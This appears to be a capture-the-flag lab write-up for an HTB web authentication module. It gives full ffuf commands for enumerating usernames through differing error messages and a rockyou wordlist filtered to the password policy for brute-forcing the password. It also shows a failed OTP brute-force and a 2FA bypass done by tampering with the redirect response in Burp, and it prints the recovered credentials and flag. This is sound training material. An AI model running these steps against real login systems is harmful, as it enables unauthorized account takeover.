## Scenario

You are tasked to perform a security assessment of a client's web application. For the assessment, the client has not provided you with credentials. Apply what you have learned in this module to obtain the flag.

Let's begin by checking the website:

![](../images/Pasted%20image%2020250215140227.png)

We have a login functionality, let's check it out:

![](../images/Pasted%20image%2020250215140248.png)

We can begin by registering a new account and checking the behavior in burp:

```ad-note
`test`:`test`
```

If we do those credentials, we get the following:


![](../images/Pasted%20image%2020250215140815.png)


Now we know the password policy, it goes like this:

```ad-important
Password does not meet our password policy:
    Contains at least one digit
    Contains at least one lower-case character
    Contains at least one upper-case character
    Contains NO special characters
    Is exactly 12 characters long
```

Nice, let's register an account that goes like that:

```ad-note
`test`:`Passw0rd1123`
```

We can now test how it looks like when a valid username goes through the application:

![](../images/Pasted%20image%2020250215155348.png)

We get `Invalid credentials`, what if we use an invalid user:

![](../images/Pasted%20image%2020250215155424.png)

Now we get another error `Unknown username or password.`, once we know this, we can use ffuf in order to fuzz for valid usernames:

```
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.55.157:40800/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -fr "Unknown username or password." -ic -c -t 200
```

After a while, we get the following:

```
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.55.157:40800/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -fr "Unknown username or password." -ic -c -t 200

gladys                  [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 196ms]
```

We got a valid username:

```
gladys
```

Now, with the valid username, we can try to brute-force the password creating a custom wordlist matching the password policy, let's grep the `rockyou.txt` wordlist:

```
grep -P '^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])[A-Za-z0-9]{12}$' /usr/share/wordlists/rockyou.txt > filtered_rockyou.txt
```

This will filter `rockyou` wordlist to match the password policy, now let's use ffuf:


```
ffuf -w filtered_rockyou.txt -u http://94.237.55.157:40800/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials" -ic -c -t 200
```


After a while, we get this:

```
ffuf -w filtered_rockyou.txt -u http://94.237.55.157:40800/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials" -ic -c -t 200

dWinaldasD13            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 156ms]
```

We got credentials:

```ad-note
`gladys`:`dWinaldasD13`
```

If we try to log in, we can see the following:

![](../images/Pasted%20image%2020250215160432.png)

We are redirected to `/2fa.php`, we need to bypass it, let's do the following:

Let's start by sending a request and checking the behavior:

![](../images/Pasted%20image%2020250215160533.png)

If we send an invalid OTP, we get `Invalid OTP` error, knowing this, let's create a list of OTPs and fuzz:

```
seq -w 0 9999 > tokens.txt
```

```
ffuf -w tokens.txt -u http://94.237.55.157:40800/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=k0p7io2i4ucilmknkgt9m2ukd5" -d "otp=FUZZ" -fr "Invalid OTP" -ic -c -t 200
```

After a while, we are unable to get any OTP by fuzzing, which means, this is not the intended path to take, that's when logging into our `test` account is truly helpful, if we log in, we can see the following:

![](../images/Pasted%20image%2020250215164723.png)

We are redirected to `/profile.php` instead of `/2fa.php`, that means that if we're able to change the `Location` to `/profile.php` on glady's account, we'd be able to bypass the 2fa code requirement, let's do it:

![](../images/Pasted%20image%2020250215164842.png)

`Do intercept -> Response to this request`:

![](../images/Pasted%20image%2020250215164923.png)

Now, change `Location` to `/profile.php`:

![](../images/Pasted%20image%2020250215165100.png)

Forward and `Do intercept -> Response to this request` again:

![](../images/Pasted%20image%2020250215165141.png)

We get a GET request, we need to intercept this one too and change status code to `200` and `location` to `/profile.php` again:

![](../images/Pasted%20image%2020250215165225.png)

After forwarding the request, this happens:

![](../images/Pasted%20image%2020250215165242.png)

We get access to glady's account and got the flag:

```
HTB{d86115e037388d0fa29280b737fd9171} 
```
